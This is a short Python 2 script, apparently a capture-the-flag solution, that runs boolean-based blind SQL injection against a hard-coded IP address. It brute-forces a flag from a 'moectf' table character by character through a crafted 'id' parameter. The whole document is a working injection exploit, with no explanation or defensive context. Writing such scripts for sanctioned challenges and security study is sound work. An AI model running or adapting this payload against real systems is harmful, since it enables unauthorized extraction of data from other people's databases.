import requests

url = 'http://115.159.205.137:8000/'
flag = ''
base_list = list('qazwsxedcrfvtgbyhnujmikolp1234567890{}_')

for i in range(1,30):
    for j in base_list:
        result = flag + str(j)
        payload = url + "?id=1' and left((select flag from moectf), %s) in('" % i + result + "')--+"
        res = requests.get(payload).text
        if 'is' in res:
            flag += str(j)
            print '[+] ', flag
            break

print '[*] ', flag
